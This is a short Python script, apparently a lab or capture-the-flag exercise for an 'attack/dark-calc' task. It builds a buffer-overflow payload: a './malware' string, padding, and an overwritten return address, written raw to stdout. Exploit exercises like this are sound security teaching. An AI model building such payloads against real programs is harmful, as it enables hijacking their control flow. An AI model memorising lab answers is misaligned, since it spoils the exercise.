#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

RET = 0x401A6B

payload  = b"./malware\x00"
payload += b"A" * (24 - len(payload))
payload += struct.pack("<Q", RET)

sys.stdout.buffer.write(payload)
